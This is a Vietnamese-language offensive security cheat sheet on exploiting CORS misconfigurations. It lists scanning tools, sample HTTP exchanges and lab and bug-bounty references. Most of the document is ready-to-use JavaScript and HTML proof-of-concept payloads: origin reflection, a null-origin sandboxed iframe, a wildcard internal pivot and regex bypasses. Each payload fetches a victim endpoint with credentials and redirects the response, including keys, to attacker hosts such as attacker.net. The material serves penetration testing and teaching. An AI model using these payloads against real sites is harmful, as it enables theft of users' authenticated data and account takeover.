# Cấu hình sai CORS (CORS Misconfiguration)

> Một lỗi cấu hình sai CORS trên toàn bộ trang web đã tồn tại đối với một domain API. Điều này cho phép kẻ tấn công thực hiện các request cross origin thay mặt cho người dùng vì ứng dụng không đưa header Origin vào whitelist và có Access-Control-Allow-Credentials: true, nghĩa là chúng ta có thể thực hiện request từ site của kẻ tấn công bằng cách sử dụng thông tin xác thực của nạn nhân.

## Mục lục

* [Công cụ](#tools)
* [Yêu cầu](#requirements)
* [Phương pháp](#methodology)
    * [Phản chiếu Origin (Origin Reflection)](#origin-reflection)
    * [Null Origin](#null-origin)
    * [XSS trên Origin đáng tin cậy](#xss-on-trusted-origin)
    * [Wildcard Origin không có Credentials](#wildcard-origin-without-credentials)
    * [Mở rộng Origin](#expanding-the-origin)
* [Bài lab](#labs)
* [Tài liệu tham khảo](#references)

## Công cụ

* [s0md3v/Corsy](https://github.com/s0md3v/Corsy/) - Công cụ quét lỗi cấu hình CORS
* [chenjj/CORScanner](https://github.com/chenjj/CORScanner) - Công cụ quét lỗ hổng cấu hình sai CORS nhanh
* [@honoki/PostMessage](https://tools.honoki.net/postmessage.html) - Trình xây dựng POC
* [trufflesecurity/of-cors](https://github.com/trufflesecurity/of-cors) - Khai thác các lỗi cấu hình sai CORS trên mạng nội bộ
* [omranisecurity/CorsOne](https://github.com/omranisecurity/CorsOne) - Công cụ phát hiện nhanh lỗi cấu hình sai CORS

## Yêu cầu

* HEADER CỦA BURP> `Origin: https://evil.com`
* HEADER CỦA NẠN NHÂN> `Access-Control-Allow-Credential: true`
* HEADER CỦA NẠN NHÂN> `Access-Control-Allow-Origin: https://evil.com` HOẶC `Access-Control-Allow-Origin: null`

## Phương pháp

Thông thường bạn sẽ muốn nhắm mục tiêu vào một API endpoint. Sử dụng payload sau để khai thác một lỗi cấu hình sai CORS trên mục tiêu `https://victim.example.com/endpoint`.

### Phản chiếu Origin (Origin Reflection)

#### Cách triển khai dễ bị tổn thương

```powershell
GET /endpoint HTTP/1.1
Host: victim.example.com
Origin: https://evil.com
Cookie: sessionid=... 

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

#### Bằng chứng khái niệm (Proof Of Concept)

PoC này yêu cầu script JS tương ứng phải được host tại `evil.com`

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://victim.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText; 
};
```

hoặc

```html
<html>
     <body>
         <h2>CORS PoC</h2>
         <div id="demo">
             <button type="button" onclick="cors()">Exploit</button>
         </div>
         <script>
             function cors() {
             var xhr = new XMLHttpRequest();
             xhr.onreadystatechange = function() {
                 if (this.readyState == 4 && this.status == 200) {
                 document.getElementById("demo").innerHTML = alert(this.responseText);
                 }
             };
              xhr.open("GET",
                       "https://victim.example.com/endpoint", true);
             xhr.withCredentials = true;
             xhr.send();
             }
         </script>
     </body>
 </html>
```

### Null Origin

#### Cách triển khai dễ bị tổn thương

Có thể server không phản chiếu (reflect) toàn bộ header `Origin` nhưng
origin `null` lại được cho phép. Điều này sẽ trông như thế này trong phản hồi
của server:

```ps1
GET /endpoint HTTP/1.1
Host: victim.example.com
Origin: null
Cookie: sessionid=... 

HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

#### Bằng chứng khái niệm (Proof Of Concept)

Điều này có thể bị khai thác bằng cách đặt mã tấn công vào một iframe sử dụng
data URI scheme. Nếu data URI scheme được sử dụng, trình duyệt sẽ dùng origin
`null` trong request:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://victim.example.com/endpoint',true);
  req.withCredentials = true;
  req.send();

  function reqListener() {
    location='https://attacker.example.net/log?key='+encodeURIComponent(this.responseText);
   };
</script>"></iframe> 
```

### XSS trên Origin đáng tin cậy

Nếu ứng dụng có triển khai một whitelist nghiêm ngặt các origin được phép,
đoạn mã khai thác ở trên sẽ không hoạt động. Nhưng nếu bạn có một lỗ hổng XSS
trên một origin đáng tin cậy, bạn có thể chèn đoạn mã khai thác ở trên để
khai thác CORS một lần nữa.

```ps1
https://trusted-origin.example.com/?xss=<script>CORS-ATTACK-PAYLOAD</script>
```

### Wildcard Origin không có Credentials

Nếu server phản hồi với một wildcard origin `*`, **trình duyệt sẽ không bao giờ
gửi cookie**. Tuy nhiên, nếu server không yêu cầu xác thực, vẫn có thể truy
cập dữ liệu trên server. Điều này có thể xảy ra trên các server nội bộ không
thể truy cập được từ Internet. Website của kẻ tấn công sau đó có thể xoay
trục (pivot) vào mạng nội bộ và truy cập dữ liệu của server mà không cần xác
thực.

```powershell
* là wildcard origin duy nhất
https://*.example.com không hợp lệ
```

#### Cách triển khai dễ bị tổn thương

```powershell
GET /endpoint HTTP/1.1
Host: api.internal.example.com
Origin: https://evil.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: *

{"[private API key]"}
```

#### Bằng chứng khái niệm (Proof Of Concept)

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.internal.example.com/endpoint',true); 
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText; 
};
```

### Mở rộng Origin

Đôi khi, một số cách mở rộng của origin gốc lại không được lọc ở phía server.
Điều này có thể do sử dụng biểu thức chính quy (regular expressions) được
triển khai kém để xác thực header origin.

#### Cách triển khai dễ bị tổn thương (Ví dụ 1)

Trong kịch bản này, bất kỳ tiền tố nào được chèn vào phía trước `example.com`
đều sẽ được server chấp nhận.

```ps1
GET /endpoint HTTP/1.1
Host: api.example.com
Origin: https://evilexample.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evilexample.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

#### Bằng chứng khái niệm (Ví dụ 1)

PoC này yêu cầu script JS tương ứng phải được host tại `evilexample.com`

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText; 
};
```

#### Cách triển khai dễ bị tổn thương (Ví dụ 2)

Trong kịch bản này, server sử dụng một regex mà dấu chấm không được escape
đúng cách. Chẳng hạn, một thứ gì đó giống như: `^api.example.com$` thay vì
`^api\.example.com$`. Do đó, dấu chấm có thể được thay thế bằng bất kỳ chữ
cái nào để có được quyền truy cập từ một domain của bên thứ ba.

```ps1
GET /endpoint HTTP/1.1
Host: api.example.com
Origin: https://apiiexample.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://apiiexample.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

#### Bằng chứng khái niệm (Ví dụ 2)

PoC này yêu cầu script JS tương ứng phải được host tại `apiiexample.com`

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText; 
};
```

## Bài lab

* [PortSwigger - CORS vulnerability with basic origin reflection](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)
* [PortSwigger - CORS vulnerability with trusted null origin](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)
* [PortSwigger - CORS vulnerability with trusted insecure protocols](https://portswigger.net/web-security/cors/lab-breaking-https-attack)
* [PortSwigger - CORS vulnerability with internal network pivot attack](https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack)

## Tài liệu tham khảo

* [[██████] Cross-origin resource sharing misconfiguration (CORS) - Vadim (jarvis7) - December 20, 2018](https://hackerone.com/reports/470298)
* [Advanced CORS Exploitation Techniques - Corben Leo - June 16, 2018](https://web.archive.org/web/20190516052453/https://www.corben.io/advanced-cors-techniques/)
* [CORS misconfig | Account Takeover - Rohan (nahoragg) - October 20, 2018](https://web.archive.org/web/20250426222841/https://hackerone.com/reports/426147)
* [CORS Misconfiguration leading to Private Information Disclosure - sandh0t (sandh0t) - October 29, 2018](https://web.archive.org/web/20190820201328/https://hackerone.com/reports/430249)
* [CORS Misconfiguration on www.zomato.com - James Kettle (albinowax) - September 15, 2016](https://web.archive.org/web/20171230084544/https://hackerone.com/reports/168574)
* [CORS Misconfigurations Explained - Detectify Blog - April 26, 2018](https://web.archive.org/web/20230323053559/https://blog.detectify.com/2018/04/26/cors-misconfigurations-explained/)
* [Cross-origin resource sharing (CORS) - PortSwigger Web Security Academy - December 30, 2019](https://web.archive.org/web/20260302141111/https://portswigger.net/web-security/cors)
* [Cross-origin resource sharing misconfig | steal user information - bughunterboy (bughunterboy) - June 1, 2017](https://web.archive.org/web/20250512191501/https://hackerone.com/reports/235200)
* [Exploiting CORS misconfigurations for Bitcoins and bounties - James Kettle - October 14, 2016](https://web.archive.org/web/20190919034024/https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
* [Exploiting Misconfigured CORS (Cross Origin Resource Sharing) - Geekboy - December 16, 2016](https://web.archive.org/web/20260204152901/https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/)
* [Think Outside the Scope: Advanced CORS Exploitation Techniques - Ayoub Safa (Sandh0t) - May 14, 2019](https://web.archive.org/web/20210126182728/https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)
